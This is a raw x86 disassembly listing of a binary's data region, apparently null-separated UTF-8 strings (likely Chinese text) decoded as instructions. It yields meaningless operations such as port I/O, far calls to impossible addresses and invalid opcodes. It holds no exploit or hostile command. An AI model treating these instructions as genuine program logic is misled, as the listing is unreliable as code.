  406f94:	9b                   	fwait
  406f95:	e5 90                	in     $0x90,%eax
  406f97:	88 e6                	mov    %ah,%dh
  406f99:	8e a5 e5 90 88 e9    	mov    -0x16776f1b(%ebp),%fs
  406f9f:	a1 a7 e9 a1 a7       	mov    0xa7a1e9a7,%eax
  406fa4:	e5 ad                	in     $0xad,%eax
  406fa6:	ab                   	stos   %eax,%es:(%edi)
  406fa7:	00 e5                	add    %ah,%ch
  406fa9:	b0 8e                	mov    $0x8e,%al
  406fab:	e9 a1 a7 e5 b8       	jmp    0xb9261751
  406fb0:	8c e9                	mov    %gs,%ecx
  406fb2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406fb3:	96                   	xchg   %eax,%esi
  406fb4:	e5 ad                	in     $0xad,%eax
  406fb6:	ab                   	stos   %eax,%es:(%edi)
  406fb7:	00 e9                	add    %ch,%cl
  406fb9:	a1 a7 e5 9f b7       	mov    0xb79fe5a7,%eax
  406fbe:	e5 85                	in     $0x85,%eax
  406fc0:	ac                   	lods   %ds:(%esi),%al
  406fc1:	e5 a5                	in     $0xa5,%eax
  406fc3:	b9 e4 ba ba e9       	mov    $0xe9babae4,%ecx
  406fc8:	87 91 e5 85 ac e9    	xchg   %edx,-0x16537a1b(%ecx)
  406fce:	a1 a7 e5 b8 8c       	mov    0x8cb8e5a7,%eax
  406fd3:	e5 b8                	in     $0xb8,%eax
  406fd5:	ad                   	lods   %ds:(%esi),%eax
  406fd6:	e4 ba                	in     $0xba,%al
  406fd8:	ba e6 be a4 e5       	mov    $0xe5a4bee6,%edx
  406fdd:	ae                   	scas   %es:(%edi),%al
  406fde:	98                   	cwtl
  406fdf:	00 e5                	add    %ah,%ch
  406fe1:	95                   	xchg   %eax,%ebp
  406fe2:	86 e6                	xchg   %ah,%dh
  406fe4:	be a4 e7 b9 bc       	mov    $0xbcb9e7a4,%esi
  406fe9:	e5 a4                	in     $0xa4,%eax
  406feb:	aa                   	stos   %al,%es:(%edi)
  406fec:	e5 b0                	in     $0xb0,%eax
  406fee:	8e e5                	mov    %ebp,%fs
  406ff0:	b8 ad e5 8f 97       	mov    $0x978fe5ad,%eax
  406ff5:	e5 bc                	in     $0xbc,%eax
  406ff7:	95                   	xchg   %eax,%ebp
  406ff8:	e6 8e                	out    %al,$0x8e
  406ffa:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406ffb:	e5 bc                	in     $0xbc,%eax
  406ffd:	95                   	xchg   %eax,%ebp
  406ffe:	e7 82                	out    %eax,$0x82
  407000:	ba e6 be a4 e5       	mov    $0xe5a4bee6,%edx
  407005:	ae                   	scas   %es:(%edi),%al
  407006:	98                   	cwtl
  407007:	00 e6                	add    %ah,%dh
  407009:	89 bf e6 be a4 e5    	mov    %edi,-0x1a5b411a(%edi)
  40700f:	9f                   	lahf
  407010:	b7 e5                	mov    $0xe5,%bh
  407012:	bc 95 e5 b8 ad       	mov    $0xadb8e595,%esp
  407017:	e4 ba                	in     $0xba,%al
  407019:	ba e5 b0 8e e6       	mov    $0xe68eb0e5,%edx
  40701e:	95                   	xchg   %eax,%ebp
  40701f:	ac                   	lods   %ds:(%esi),%al
  407020:	e5 95                	in     $0x95,%eax
  407022:	86 e5                	xchg   %ah,%ch
  407024:	95                   	xchg   %eax,%ebp
  407025:	86 e5                	xchg   %ah,%ch
  407027:	91                   	xchg   %eax,%ecx
  407028:	bd e6 8e a5 e9       	mov    $0xe9a58ee6,%ebp
  40702d:	a1 a7 e5 ae 98       	mov    0x98aee5a7,%eax
  407032:	00 e5                	add    %ah,%ch
  407034:	ae                   	scas   %es:(%edi),%al
  407035:	b6 e7                	mov    $0xe7,%dh
  407037:	9a 84 e9 a1 a7 e6 8e 	lcall  $0x8ee6,$0xa7a1e984
  40703e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40703f:	e9 a1 a7 e5 ae       	jmp    0xaf2617e5
  407044:	98                   	cwtl
  407045:	e9 a6 96 e7 82       	jmp    0x832806f0
  40704a:	ba e5 a4 aa e5       	mov    $0xe5aaa4e5,%edx
  40704f:	ae                   	scas   %es:(%edi),%al
  407050:	b6 00                	mov    $0x0,%dh
  407052:	e5 85                	in     $0x85,%eax
  407054:	ac                   	lods   %ds:(%esi),%al
  407055:	e7 9a                	out    %eax,$0x9a
  407057:	84 e6                	test   %ah,%dh
  407059:	8e a5 e5 95 86 e6    	mov    -0x19796a1b(%ebp),%fs
  40705f:	88 90 e5 a5 b9 e5    	mov    %dl,-0x1a465a1b(%eax)
  407065:	ae                   	scas   %es:(%edi),%al
  407066:	b6 00                	mov    $0x0,%dh
  407068:	e7 9a                	out    %eax,$0x9a
  40706a:	84 e9                	test   %ch,%cl
  40706c:	87 91 e5 95 86 e6    	xchg   %edx,-0x19796a1b(%ecx)
  407072:	b3 95                	mov    $0x95,%bl
  407074:	e9 a1 a7 e4 ba       	jmp    0xbb25181a
  407079:	ba e7 ae a1 e5       	mov    $0xe5a1aee7,%edx
  40707e:	ae                   	scas   %es:(%edi),%al
  40707f:	98                   	cwtl
  407080:	e6 98                	out    %al,$0x98
  407082:	af                   	scas   %es:(%edi),%eax
  407083:	e5 ae                	in     $0xae,%eax
  407085:	b6 00                	mov    $0x0,%dh
  407087:	e5 9f                	in     $0x9f,%eax
  407089:	b7 e6                	mov    $0xe6,%bh
  40708b:	89 bf e6 88 90 e9    	mov    %edi,-0x166f771a(%edi)
  407091:	a1 a7 e7 9a 84       	mov    0x849ae7a7,%eax
  407096:	e5 b0                	in     $0xb0,%eax
  407098:	8e e5                	mov    %ebp,%fs
  40709a:	91                   	xchg   %eax,%ecx
  40709b:	bd e5 ad 90 e5       	mov    $0xe590ade5,%ebp
  4070a0:	9f                   	lahf
  4070a1:	8e e5                	mov    %ebp,%fs
  4070a3:	b0 87                	mov    $0x87,%al
  4070a5:	00 e5                	add    %ah,%ch
  4070a7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4070a8:	aa                   	stos   %al,%es:(%edi)
  4070a9:	e9 a1 a7 e6 98       	jmp    0x9927184f
  4070ae:	af                   	scas   %es:(%edi),%eax
  4070af:	e5 b0                	in     $0xb0,%eax
  4070b1:	8a e6                	mov    %dh,%ah
  4070b3:	b3 95                	mov    $0x95,%bl
  4070b5:	e5 95                	in     $0x95,%eax
  4070b7:	86 e5                	xchg   %ah,%ch
  4070b9:	b8 ad e6 88 90       	mov    $0x9088e6ad,%eax
  4070be:	e5 ad                	in     $0xad,%eax
  4070c0:	90                   	nop
  4070c1:	e5 b0                	in     $0xb0,%eax
  4070c3:	87 00                	xchg   %eax,(%eax)
  4070c5:	e9 a1 a7 e7 9a       	jmp    0x9b28186b
  4070ca:	84 e4                	test   %ah,%ah
  4070cc:	ba ba e7 8e 89       	mov    $0x898ee7ba,%edx
  4070d1:	e5 a4                	in     $0xa4,%eax
  4070d3:	aa                   	stos   %al,%es:(%edi)
  4070d4:	e7 9a                	out    %eax,$0x9a
  4070d6:	84 e6                	test   %ah,%dh
  4070d8:	b3 95                	mov    $0x95,%bl
  4070da:	e9 a1 a7 e7 9a       	jmp    0x9b281880
  4070df:	84 e9                	test   %ch,%cl
  4070e1:	a1 a7 e5 ad ab       	mov    0xabade5a7,%eax
  4070e6:	e5 b0                	in     $0xb0,%eax
  4070e8:	87 00                	xchg   %eax,(%eax)
  4070ea:	e4 ba                	in     $0xba,%al
  4070ec:	ba e5 9f b7 e7       	mov    $0xe7b79fe5,%edx
  4070f1:	94                   	xchg   %eax,%esp
  4070f2:	9f                   	lahf
  4070f3:	e5 b8                	in     $0xb8,%eax
  4070f5:	ad                   	lods   %ds:(%esi),%eax
  4070f6:	e6 9c                	out    %al,$0x9c
  4070f8:	9b                   	fwait
  4070f9:	e8 a1 8c e7 9a       	call   0x9b27fd9f
  4070fe:	84 e7                	test   %ah,%bh
  407100:	9a 84 e5 8f 97 e7 94 	lcall  $0x94e7,$0x978fe584
  407107:	9f                   	lahf
  407108:	e7 ae                	out    %eax,$0xae
  40710a:	a1 e6 98 af e5       	mov    0xe5af98e6,%eax
  40710f:	b8 ad e5 b0 87       	mov    $0x87b0e5ad,%eax
  407114:	00 e7                	add    %ah,%bh
  407116:	9a 84 e6 9c 9b e9 a1 	lcall  $0xa1e9,$0x9b9ce684
  40711d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40711e:	e5 b8                	in     $0xb8,%eax
  407120:	8c e7                	mov    %fs,%edi
  407122:	9a 84 e5 bc 95 e4 ba 	lcall  $0xbae4,$0x95bce584
  407129:	ba e5 9f b7 e9       	mov    $0xe9b79fe5,%edx
  40712e:	a1 a7 e5 b0 87       	mov    0x87b0e5a7,%eax
  407133:	00 e6                	add    %ah,%dh
  407135:	98                   	cwtl
  407136:	af                   	scas   %es:(%edi),%eax
  407137:	e5 90                	in     $0x90,%eax
  407139:	88 e4                	mov    %ah,%ah
  40713b:	bd bf e6 be a4       	mov    $0xa4bee6bf,%ebp
  407140:	e5 b8                	in     $0xb8,%eax
  407142:	ad                   	lods   %ds:(%esi),%eax
  407143:	e6 be                	out    %al,$0xbe
  407145:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407146:	e5 b8                	in     $0xb8,%eax
  407148:	ad                   	lods   %ds:(%esi),%eax
  407149:	e4 ba                	in     $0xba,%al
  40714b:	ba e5 b0 8a 00       	mov    $0x8ab0e5,%edx
  407150:	e7 9a                	out    %eax,$0x9a
  407152:	84 e5                	test   %ah,%ch
  407154:	9f                   	lahf
  407155:	8e e4                	mov    %esp,%fs
  407157:	ba ba e5 b0 8a       	mov    $0x8ab0e5ba,%edx
  40715c:	e9 a1 a7 e9 87       	jmp    0x882a1902
  407161:	91                   	xchg   %eax,%ecx
  407162:	e5 b0                	in     $0xb0,%eax
  407164:	8a 00                	mov    (%eax),%al
  407166:	e5 ad                	in     $0xad,%eax
  407168:	90                   	nop
  407169:	e5 8f                	in     $0x8f,%eax
  40716b:	97                   	xchg   %eax,%edi
  40716c:	e6 95                	out    %al,$0x95
  40716e:	ac                   	lods   %ds:(%esi),%al
  40716f:	e5 9f                	in     $0x9f,%eax
  407171:	b7 e5                	mov    $0xe5,%bh
  407173:	b0 8e                	mov    $0x8e,%al
  407175:	00 e7                	add    %ah,%bh
  407177:	ae                   	scas   %es:(%edi),%al
  407178:	a1 e5 b0 8e e5       	mov    0xe58eb0e5,%eax
  40717d:	95                   	xchg   %eax,%ebp
  40717e:	86 e5                	xchg   %ah,%ch
  407180:	8f                   	(bad)
  407181:	b8 e9 a1 a7 e6       	mov    $0xe6a7a1e9,%eax
  407186:	8e a5 e5 a4 aa e5    	mov    -0x1a555b1b(%ebp),%fs
  40718c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40718d:	aa                   	stos   %al,%es:(%edi)
  40718e:	e5 b0                	in     $0xb0,%eax
  407190:	8e 00                	mov    (%eax),%es
  407192:	e5 a4                	in     $0xa4,%eax
  407194:	aa                   	stos   %al,%es:(%edi)
  407195:	e7 ae                	out    %eax,$0xae
  407197:	a1 e6 98 af e5       	mov    0xe5af98e6,%eax
  40719c:	bc 95 e7 9a 84       	mov    $0x849ae795,%esp
  4071a1:	e6 b3                	out    %al,$0xb3
  4071a3:	95                   	xchg   %eax,%ebp
  4071a4:	e5 91                	in     $0x91,%eax
  4071a6:	bd e5 b8 8c 00       	mov    $0x8cb8e5,%ebp
  4071ab:	e6 88                	out    %al,$0x88
  4071ad:	90                   	nop
  4071ae:	e6 98                	out    %al,$0x98
  4071b0:	af                   	scas   %es:(%edi),%eax
  4071b1:	e6 88                	out    %al,$0x88
  4071b3:	90                   	nop
  4071b4:	e6 95                	out    %al,$0x95
  4071b6:	ac                   	lods   %ds:(%esi),%al
  4071b7:	e5 91                	in     $0x91,%eax
  4071b9:	bd e7 9a 84 e5       	mov    $0xe5849ae7,%ebp
  4071be:	b8 8c 00 e7 82       	mov    $0x82e7008c,%eax
  4071c3:	ba e9 a1 a7 e5       	mov    $0xe5a7a1e9,%edx
  4071c8:	91                   	xchg   %eax,%ecx
  4071c9:	bd e9 a1 a7 e5       	mov    $0xe5a7a1e9,%ebp
  4071ce:	85 ac e5 b8 ad 00 e7 	test   %ebp,-0x18ff5248(%ebp,%eiz,8)
  4071d5:	9a 84 e5 a4 aa e5 b8 	lcall  $0xb8e5,$0xaaa4e584
  4071dc:	8c e5                	mov    %fs,%ebp
  4071de:	8f                   	(bad)
  4071df:	b8 e5 b0 87 e7       	mov    $0xe787b0e5,%eax
  4071e4:	9a 84 e5 9f 8e e7 82 	lcall  $0x82e7,$0x8e9fe584
  4071eb:	ba e5 a4 aa e5       	mov    $0xe5aaa4e5,%edx
  4071f0:	bc 95 e6 95 ac       	mov    $0xac95e695,%esp
  4071f5:	e5 b0                	in     $0xb0,%eax
  4071f7:	8a e5                	mov    %ch,%ah
  4071f9:	bc 95 00 e6 89       	mov    $0x89e60095,%esp
  4071fe:	bf e9 a1 a7 e5       	mov    $0xe5a7a1e9,%edi
  407203:	91                   	xchg   %eax,%ecx
  407204:	bd e7 b9 bc e6       	mov    $0xe6bcb9e7,%ebp
  407209:	98                   	cwtl
  40720a:	af                   	scas   %es:(%edi),%eax
  40720b:	e7 8e                	out    %eax,$0x8e
  40720d:	89 e7                	mov    %esp,%edi
  40720f:	a8 8b                	test   $0x8b,%al
  407211:	e5 bc                	in     $0xbc,%eax
  407213:	95                   	xchg   %eax,%ebp
  407214:	00 e5                	add    %ah,%ch
  407216:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407217:	aa                   	stos   %al,%es:(%edi)
  407218:	e5 ae                	in     $0xae,%eax
  40721a:	98                   	cwtl
  40721b:	e5 a4                	in     $0xa4,%eax
  40721d:	aa                   	stos   %al,%es:(%edi)
  40721e:	e9 a1 a7 e5 ae       	jmp    0xaf2619c4
  407223:	98                   	cwtl
  407224:	e5 b0                	in     $0xb0,%eax
  407226:	8a e7                	mov    %bh,%ah
  407228:	9a 84 e7 9a 84 e5 ad 	lcall  $0xade5,$0x849ae784
  40722f:	ab                   	stos   %eax,%es:(%edi)
  407230:	e7 ae                	out    %eax,$0xae
  407232:	a1 e5 b0 87 e5       	mov    0xe587b0e5,%eax
  407237:	95                   	xchg   %eax,%ebp
  407238:	86 e9                	xchg   %ch,%cl
  40723a:	a1 a7 e5 bc 95       	mov    0x95bce5a7,%eax
  40723f:	00 e9                	add    %ch,%cl
  407241:	a1 a7 e6 be a4       	mov    0xa4bee6a7,%eax
  407246:	e5 a5                	in     $0xa5,%eax
  407248:	b9 e4 ba ba e6       	mov    $0xe6babae4,%ecx
  40724d:	88 90 00 e7 94 9f    	mov    %dl,-0x606b1900(%eax)
  407253:	e4 bd                	in     $0xbd,%al
  407255:	bf e5 ae 98 e7       	mov    $0xe798aee5,%edi
  40725a:	94                   	xchg   %eax,%esp
  40725b:	9f                   	lahf
  40725c:	e6 88                	out    %al,$0x88
  40725e:	90                   	nop
  40725f:	e6 9c                	out    %al,$0x9c
  407261:	9b                   	fwait
  407262:	e6 88                	out    %al,$0x88
  407264:	90                   	nop
  407265:	00 e9                	add    %ch,%cl
  407267:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407268:	96                   	xchg   %eax,%esi
  407269:	e8 a1 8c e9 a1       	call   0xa229ff0f
  40726e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40726f:	e6 88                	out    %al,$0x88
  407271:	90                   	nop
  407272:	e7 94                	out    %eax,$0x94
  407274:	9f                   	lahf
  407275:	e6 88                	out    %al,$0x88
  407277:	90                   	nop
  407278:	00 e6                	add    %ah,%dh
  40727a:	be a4 e8 a1 8c       	mov    $0x8ca1e8a4,%esi
  40727f:	e6 8e                	out    %al,$0x8e
  407281:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407282:	e7 ae                	out    %eax,$0xae
  407284:	a1 e5 b8 ad e7       	mov    0xe7adb8e5,%eax
  407289:	9a 84 e5 a4 aa e9 87 	lcall  $0x87e9,$0xaaa4e584
  407290:	91                   	xchg   %eax,%ecx
  407291:	e9 87 91 e5 95       	jmp    0x9626041d
  407296:	86 e6                	xchg   %ah,%dh
  407298:	95                   	xchg   %eax,%ebp
  407299:	ac                   	lods   %ds:(%esi),%al
  40729a:	e7 9a                	out    %eax,$0x9a
  40729c:	84 e6                	test   %ah,%dh
  40729e:	88 90 00 e7 9a 84    	mov    %dl,-0x7b651900(%eax)
  4072a4:	e5 95                	in     $0x95,%eax
  4072a6:	86 e8                	xchg   %ch,%al
  4072a8:	a1 8c e7 9a 84       	mov    0x849ae78c,%eax
  4072ad:	e9 a1 a7 e6 88       	jmp    0x89271a53
  4072b2:	90                   	nop
  4072b3:	00 e5                	add    %ah,%ch
  4072b5:	91                   	xchg   %eax,%ecx
  4072b6:	bd e4 bd bf e6       	mov    $0xe6bfbde4,%ebp
  4072bb:	8e a5 e9 a1 a7 e7    	mov    -0x18585e17(%ebp),%fs
  4072c1:	94                   	xchg   %eax,%esp
  4072c2:	9f                   	lahf
  4072c3:	e5 8f                	in     $0x8f,%eax
  4072c5:	97                   	xchg   %eax,%edi
  4072c6:	e8 a1 8c e5 95       	call   0x9625ff6c
  4072cb:	86 e5                	xchg   %ah,%ch
  4072cd:	ad                   	lods   %ds:(%esi),%eax
  4072ce:	ab                   	stos   %eax,%es:(%edi)
  4072cf:	e6 be                	out    %al,$0xbe
  4072d1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4072d2:	e4 bd                	in     $0xbd,%al
  4072d4:	bf e5 9f 8e e6       	mov    $0xe68e9fe5,%edi
  4072d9:	89 bf 00 e6 88 90    	mov    %edi,-0x6f771a00(%edi)
  4072df:	e5 9f                	in     $0x9f,%eax
  4072e1:	8e e7                	mov    %edi,%fs
  4072e3:	82 ba e9 a1 a7 e6 be 	cmpb   $0xbe,-0x19585e17(%edx)
  4072ea:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4072eb:	e5 8f                	in     $0x8f,%eax
  4072ed:	b8 e5 95 86 e5       	mov    $0xe58695e5,%eax
  4072f2:	b0 8e                	mov    $0x8e,%al
  4072f4:	e5 a4                	in     $0xa4,%eax
  4072f6:	aa                   	stos   %al,%es:(%edi)
  4072f7:	e6 8e                	out    %al,$0x8e
  4072f9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4072fa:	00 e5                	add    %ah,%ch
  4072fc:	90                   	nop
  4072fd:	88 e5                	mov    %ah,%ch
  4072ff:	8f                   	(bad)
  407300:	97                   	xchg   %eax,%edi
  407301:	e9 a6 96 e5 a4       	jmp    0xa52609ac
  407306:	aa                   	stos   %al,%es:(%edi)
  407307:	e6 9c                	out    %al,$0x9c
  407309:	9b                   	fwait
  40730a:	e5 ad                	in     $0xad,%eax
  40730c:	ab                   	stos   %eax,%es:(%edi)
  40730d:	e5 ad                	in     $0xad,%eax
  40730f:	ab                   	stos   %eax,%es:(%edi)
  407310:	e6 8e                	out    %al,$0x8e
  407312:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407313:	00 e4                	add    %ah,%ah
  407315:	ba ba e5 8f 97       	mov    $0x978fe5ba,%edx
  40731a:	e5 9f                	in     $0x9f,%eax
  40731c:	b7 e7                	mov    $0xe7,%bh
  40731e:	ae                   	scas   %es:(%edi),%al
  40731f:	a1 e7 8e 89 e6       	mov    0xe6898ee7,%eax
  407324:	98                   	cwtl
  407325:	af                   	scas   %es:(%edi),%eax
  407326:	e4 bd                	in     $0xbd,%al
  407328:	bf e6 88 90 e6       	mov    $0xe69088e6,%edi
  40732d:	8e a5 00 e6 88 90    	mov    -0x6f771a00(%ebp),%fs
  407333:	e7 b9                	out    %eax,$0xb9
  407335:	bc e5 b0 8e e7       	mov    $0xe78eb0e5,%esp
  40733a:	82 ba e7 94 9f e9 a1 	cmpb   $0xa1,-0x16606b19(%edx)
  407341:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407342:	e6 95                	out    %al,$0x95
  407344:	ac                   	lods   %ds:(%esi),%al
  407345:	00 e7                	add    %ah,%bh
  407347:	9a 84 e5 91 bd e4 ba 	lcall  $0xbae4,$0xbd91e584
  40734e:	ba e7 9a 84 e5       	mov    $0xe5849ae7,%edx
  407353:	ad                   	lods   %ds:(%esi),%eax
  407354:	ab                   	stos   %eax,%es:(%edi)
  407355:	e5 b8                	in     $0xb8,%eax
  407357:	ad                   	lods   %ds:(%esi),%eax
  407358:	e7 9a                	out    %eax,$0x9a
  40735a:	84 e8                	test   %ch,%al
  40735c:	a1 8c e7 b9 bc       	mov    0xbcb9e78c,%eax
  407361:	e5 8f                	in     $0x8f,%eax
  407363:	97                   	xchg   %eax,%edi
  407364:	e5 ad                	in     $0xad,%eax
  407366:	ab                   	stos   %eax,%es:(%edi)
  407367:	e6 98                	out    %al,$0x98
  407369:	af                   	scas   %es:(%edi),%eax
  40736a:	00 e7                	add    %ah,%bh
  40736c:	9a 84 e5 ad 90 e5 8f 	lcall  $0x8fe5,$0x90ade584
  407373:	b8 e5 85 ac e5       	mov    $0xe5ac85e5,%eax
  407378:	b0 8e                	mov    $0x8e,%al
  40737a:	e6 98                	out    %al,$0x98
  40737c:	af                   	scas   %es:(%edi),%eax
  40737d:	00 e5                	add    %ah,%ch
  40737f:	b0 8e                	mov    $0x8e,%al
  407381:	e5 b0                	in     $0xb0,%eax
  407383:	87 e4                	xchg   %esp,%esp
  407385:	ba ba e5 b0 8e       	mov    $0x8eb0e5ba,%edx
  40738a:	e9 a1 a7 e6 98       	jmp    0x99271b30
  40738f:	af                   	scas   %es:(%edi),%eax
  407390:	00 e5                	add    %ah,%ch
  407392:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407393:	aa                   	stos   %al,%es:(%edi)
  407394:	e6 be                	out    %al,$0xbe
  407396:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407397:	e5 b0                	in     $0xb0,%eax
  407399:	8a e6                	mov    %dh,%ah
  40739b:	be a4 e5 ae b6       	mov    $0xb6aee5a4,%esi
  4073a0:	e5 85                	in     $0x85,%eax
  4073a2:	ac                   	lods   %ds:(%esi),%al
  4073a3:	e6 9c                	out    %al,$0x9c
  4073a5:	9b                   	fwait
  4073a6:	00 e6                	add    %ah,%dh
  4073a8:	be a4 e6 be a4       	mov    $0xa4bee6a4,%esi
  4073ad:	e7 8e                	out    %eax,$0x8e
  4073af:	89 e9                	mov    %ebp,%ecx
  4073b1:	a1 a7 e5 9f 8e       	mov    0x8e9fe5a7,%eax
  4073b6:	e5 b0                	in     $0xb0,%eax
  4073b8:	87 e5                	xchg   %esp,%ebp
  4073ba:	ad                   	lods   %ds:(%esi),%eax
  4073bb:	ab                   	stos   %eax,%es:(%edi)
  4073bc:	e7 8e                	out    %eax,$0x8e
  4073be:	89 e7                	mov    %esp,%edi
  4073c0:	8e 89 e5 91 bd e5    	mov    -0x1a426e1b(%ecx),%cs
  4073c6:	8f                   	(bad)
  4073c7:	97                   	xchg   %eax,%edi
  4073c8:	e5 ad                	in     $0xad,%eax
  4073ca:	ab                   	stos   %eax,%es:(%edi)
  4073cb:	e5 90                	in     $0x90,%eax
  4073cd:	88 e6                	mov    %ah,%dh
  4073cf:	9c                   	pushf
  4073d0:	9b                   	fwait
  4073d1:	00 e9                	add    %ch,%cl
  4073d3:	a1 a7 e6 89 bf       	mov    0xbf89e6a7,%eax
  4073d8:	e9 a1 a7 e5 9f       	jmp    0xa0261b7e
  4073dd:	8e e7                	mov    %edi,%fs
  4073df:	9a 84 e9 a6 96 e7 ae 	lcall  $0xaee7,$0x96a6e984
  4073e6:	a1 e6 be a4 e5       	mov    0xe5a4bee6,%eax
  4073eb:	b0 8e                	mov    $0x8e,%al
  4073ed:	e6 9c                	out    %al,$0x9c
  4073ef:	9b                   	fwait
  4073f0:	00 e7                	add    %ah,%bh
  4073f2:	9a 84 e7 b9 bc e9 a1 	lcall  $0xa1e9,$0xbcb9e784
  4073f9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4073fa:	e6 88                	out    %al,$0x88
  4073fc:	90                   	nop
  4073fd:	e5 91                	in     $0x91,%eax
  4073ff:	bd e5 b8 ad e6       	mov    $0xe6adb8e5,%ebp
  407404:	9c                   	pushf
  407405:	9b                   	fwait
  407406:	e5 a5                	in     $0xa5,%eax
  407408:	b9 e7 94 9f e9       	mov    $0xe99f94e7,%ecx
  40740d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40740e:	96                   	xchg   %eax,%esi
  40740f:	e5 95                	in     $0x95,%eax
  407411:	86 e6                	xchg   %ah,%dh
  407413:	9c                   	pushf
  407414:	9b                   	fwait
  407415:	e6 95                	out    %al,$0x95
  407417:	ac                   	lods   %ds:(%esi),%al
  407418:	e6 9c                	out    %al,$0x9c
  40741a:	9b                   	fwait
  40741b:	00 e9                	add    %ch,%cl
  40741d:	a1 a7 e6 95 ac       	mov    0xac95e6a7,%eax
  407422:	e5 ae                	in     $0xae,%eax
  407424:	98                   	cwtl
  407425:	e9 a1 a7 e5 a4       	jmp    0xa5261bcb
  40742a:	aa                   	stos   %al,%es:(%edi)
  40742b:	e7 94                	out    %eax,$0x94
  40742d:	9f                   	lahf
  40742e:	e5 91                	in     $0x91,%eax
  407430:	bd e9 a6 96 e7       	mov    $0xe796a6e9,%ebp
  407435:	94                   	xchg   %eax,%esp
  407436:	9f                   	lahf
  407437:	e4 ba                	in     $0xba,%al
  407439:	ba e6 b3 95 00       	mov    $0x95b3e6,%edx
  40743e:	e5 95                	in     $0x95,%eax
  407440:	86 e6                	xchg   %ah,%dh
  407442:	9c                   	pushf
  407443:	9b                   	fwait
  407444:	e9 a1 a7 e6 be       	jmp    0xbf271bea
  407449:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40744a:	e7 b9                	out    %eax,$0xb9
  40744c:	bc e7 9a 84 e7       	mov    $0xe7849ae7,%esp
  407451:	9a 84 e4 bd bf e5 95 	lcall  $0x95e5,$0xbfbde484
  407458:	86 e5                	xchg   %ah,%ch
  40745a:	85 ac e6 be a4 e7 82 	test   %ebp,-0x7d185b42(%esi,%eiz,8)
  407461:	ba e5 ad ab e6       	mov    $0xe6abade5,%edx
  407466:	b3 95                	mov    $0x95,%bl
  407468:	00 e5                	add    %ah,%ch
  40746a:	b0 8a                	mov    $0x8a,%al
  40746c:	e6 8e                	out    %al,$0x8e
  40746e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40746f:	e9 a1 a7 e6 89       	jmp    0x8a271c15
  407474:	bf e6 95 ac e6       	mov    $0xe6ac95e6,%edi
  407479:	b3 95                	mov    $0x95,%bl
  40747b:	00 e7                	add    %ah,%bh
  40747d:	9a 84 e5 a4 aa e5 a4 	lcall  $0xa4e5,$0xaaa4e584
  407484:	aa                   	stos   %al,%es:(%edi)
  407485:	e5 ad                	in     $0xad,%eax
  407487:	90                   	nop
  407488:	e5 ae                	in     $0xae,%eax
  40748a:	98                   	cwtl
  40748b:	e6 be                	out    %al,$0xbe
  40748d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40748e:	e5 bc                	in     $0xbc,%eax
  407490:	95                   	xchg   %eax,%ebp
  407491:	e6 be                	out    %al,$0xbe
  407493:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407494:	00 e5                	add    %ah,%ch
  407496:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407497:	b9 e4 bd bf e6       	mov    $0xe6bfbde4,%ecx
  40749c:	95                   	xchg   %eax,%ebp
  40749d:	ac                   	lods   %ds:(%esi),%al
  40749e:	e6 9c                	out    %al,$0x9c
  4074a0:	9b                   	fwait
  4074a1:	e4 ba                	in     $0xba,%al
  4074a3:	ba e5 91 bd e6       	mov    $0xe6bd91e5,%edx
  4074a8:	9c                   	pushf
  4074a9:	9b                   	fwait
  4074aa:	e6 be                	out    %al,$0xbe
  4074ac:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4074ad:	00 e6                	add    %ah,%dh
  4074af:	88 90 e5 91 bd e5    	mov    %dl,-0x1a426e1b(%eax)
  4074b5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4074b6:	aa                   	stos   %al,%es:(%edi)
  4074b7:	e7 9a                	out    %eax,$0x9a
  4074b9:	84 e5                	test   %ah,%ch
  4074bb:	b8 8c e7 9a 84       	mov    $0x849ae78c,%eax
  4074c0:	e7 9a                	out    %eax,$0x9a
  4074c2:	84 e7                	test   %ah,%bh
  4074c4:	9a 84 e6 be a4 e6 be 	lcall  $0xbee6,$0xa4bee684
  4074cb:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4074cc:	00 e4                	add    %ah,%ah
  4074ce:	ba ba e5 b0 87       	mov    $0x87b0e5ba,%edx
  4074d3:	e5 ad                	in     $0xad,%eax
  4074d5:	ab                   	stos   %eax,%es:(%edi)
  4074d6:	e7 9a                	out    %eax,$0x9a
  4074d8:	84 e6                	test   %ah,%dh
  4074da:	88 90 e4 bd bf e5    	mov    %dl,-0x1a40421c(%eax)
  4074e0:	95                   	xchg   %eax,%ebp
  4074e1:	86 e7                	xchg   %ah,%bh
  4074e3:	9a 84 e7 82 ba e9 a1 	lcall  $0xa1e9,$0xba82e784
  4074ea:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4074eb:	e6 be                	out    %al,$0xbe
  4074ed:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4074ee:	00 e9                	add    %ch,%cl
  4074f0:	a1 a7 e6 98 af       	mov    0xaf98e6a7,%eax
  4074f5:	e6 8e                	out    %al,$0x8e
  4074f7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4074f8:	e5 ad                	in     $0xad,%eax
  4074fa:	ab                   	stos   %eax,%es:(%edi)
  4074fb:	e6 88                	out    %al,$0x88
